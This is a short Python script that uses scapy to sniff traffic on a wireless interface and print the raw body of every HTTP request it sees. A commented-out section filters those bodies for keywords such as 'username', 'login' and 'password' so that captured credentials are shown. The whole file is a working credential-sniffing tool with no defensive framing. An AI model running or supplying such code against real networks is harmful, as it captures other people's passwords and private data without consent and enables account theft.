import scapy.all as scapy 
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store = False , prn = process_sniffed_packet )
     # store in memory is false  = save memory , prn callback func (call everytime)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
            if packet.haslayer(scapy.Raw):        
                print(packet[scapy.Raw].load)  #the same below

                # load = packet[scapy.Raw].load
                # keywords = ["username" , "user" , "login" , "password" , "Email" , "Password" , "pass"]
                # for keyword in keywords:
                #     if keyword in load :
                #         print(load)
                #         break

sniff("wlp7s0")